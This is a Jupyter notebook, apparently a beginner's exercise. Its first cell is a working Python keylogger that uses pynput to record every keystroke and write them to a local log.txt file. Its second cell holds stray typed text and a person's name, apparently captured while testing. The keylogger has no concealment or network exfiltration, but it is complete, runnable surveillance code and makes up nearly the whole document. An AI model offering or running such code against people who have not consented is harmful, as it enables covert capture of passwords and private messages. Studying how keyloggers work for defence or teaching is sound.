{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7c00b69-0910-4fd7-bda3-828a82445b3a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "keys = []\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        print('Alphanumeric key {0} pressed'.format(key.char))\n",
    "        keys.append(key.char)\n",
    "    except AttributeError:\n",
    "        print('Special key {0} pressed'.format(key))\n",
    "        keys.append(str(key))\n",
    "\n",
    "    write_file(keys)\n",
    "\n",
    "def write_file(keys):\n",
    "    with open('log.txt', 'w') as f:\n",
    "        for key in keys:\n",
    "            # removing ''\n",
    "            k = str(key).replace(\"'\", \"\")\n",
    "            if k == 'Key.space':\n",
    "                f.write(' ')\n",
    "            elif k == 'Key.enter':\n",
    "                f.write('\\n')\n",
    "            else:\n",
    "                f.write(k)\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a130470-1896-4494-85fd-7fa9b5275ec9",
   "metadata": {},
   "outputs": [],
   "source": [
    "hello guys how are u there?\n",
    "sakshi lingwal"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
